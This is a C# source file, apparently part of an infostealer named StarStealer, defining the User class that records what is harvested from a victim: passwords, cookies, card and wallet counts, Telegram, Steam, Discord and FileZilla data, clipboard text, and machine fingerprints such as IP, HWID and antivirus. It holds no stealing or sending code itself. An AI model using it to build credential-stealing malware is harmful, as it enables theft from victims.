using System.Collections.Generic;

namespace StarStealer.Entities
{
	public class User
	{
		public List<Browser> Browsers = new List<Browser>();

		public List<FileZilla> FileZillaData = new List<FileZilla>();

		public List<Password> Passwords = new List<Password>();

		public List<Cookie> Cookies = new List<Cookie>();

		public List<string> UserAgents = new List<string>();

		public int PasswordsNumber
		{
			get;
			set;
		}

		public int DesktopArchiveCount
		{
			get;
			set;
		}

		public int CookiesNumber
		{
			get;
			set;
		}

		public int CardsNumber
		{
			get;
			set;
		}

		public int WalletsNumber
		{
			get;
			set;
		}

		public bool Telegram
		{
			get;
			set;
		}

		public bool Steam
		{
			get;
			set;
		}

		public bool Bitcoin
		{
			get;
			set;
		}

		public bool FileZilla
		{
			get;
			set;
		}

		public bool Discord
		{
			get;
			set;
		}

		public string Country
		{
			get;
			set;
		}

		public string MacAddress
		{
			get;
			set;
		}

		public bool WithPhoto
		{
			get;
			set;
		}

		public int Forms
		{
			get;
			set;
		}

		public string IP
		{
			get;
			set;
		}

		public string CountryCode
		{
			get;
			set;
		}

		public string City
		{
			get;
			set;
		}

		public string Zip
		{
			get;
			set;
		}

		public string Hwid
		{
			get;
			set;
		}

		public string ID
		{
			get;
			set;
		}

		public string WindowsVersion
		{
			get;
			set;
		}

		public string RAM
		{
			get;
			set;
		}

		public string ScreenResolution
		{
			get;
			set;
		}

		public string Processor
		{
			get;
			set;
		}

		public string AntiVirus
		{
			get;
			set;
		}

		public string UserName
		{
			get;
			set;
		}

		public string MachineName
		{
			get;
			set;
		}

		public string Video
		{
			get;
			set;
		}

		public bool is64
		{
			get;
			set;
		}

		public string Time
		{
			get;
			set;
		}

		public string NT
		{
			get;
			set;
		}

		public string ClipBoardText
		{
			get;
			set;
		}
	}
}
